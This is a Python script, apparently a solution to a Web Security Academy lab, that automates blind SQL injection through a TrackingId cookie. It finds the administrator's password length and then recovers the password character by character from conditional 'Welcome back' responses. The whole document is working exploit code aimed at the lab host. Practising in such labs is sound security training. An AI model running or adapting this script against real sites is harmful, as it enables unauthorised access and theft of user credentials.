# Blind SQL injection with conditional responses
import requests
import string

url = "https://abc.web-security-academy.net/"
userName = "administrator"

passwordLengthNotFound = True
passwordLength = 0
while(passwordLengthNotFound):
    lengthRequest = requests.get(url, cookies={"TrackingId":f"x'+UNION+SELECT+'a'+FROM+users+WHERE+username='{userName}'+AND+length(password)={passwordLength}--"})
    print(f"Checking if password length is {passwordLength}")
    if "Welcome back" in lengthRequest.text:
        print(f"Password length is {passwordLength}")
        passwordLengthNotFound = False
        break
    passwordLength+=1

# Combining lowercase letters and numbers into one list
possiblePasswordCharacters = list(string.ascii_lowercase) + [str(i) for i in range(10)]
password = ""
for passwordIndex in range(1, passwordLength+1):
    for passwordCharacter in possiblePasswordCharacters:
        print(f"Checking if password is {password}{passwordCharacter}")
        lengthRequest = requests.get(url, cookies={"TrackingId":f"trackingIdCookie'+UNION+SELECT+'a'+FROM+users+WHERE+username='{userName}'+AND+substring(password, {passwordIndex},1)='{passwordCharacter}'--"})
        if "Welcome back" in lengthRequest.text:
            password += passwordCharacter
            break

print(f"The password to user {userName} is {password}")
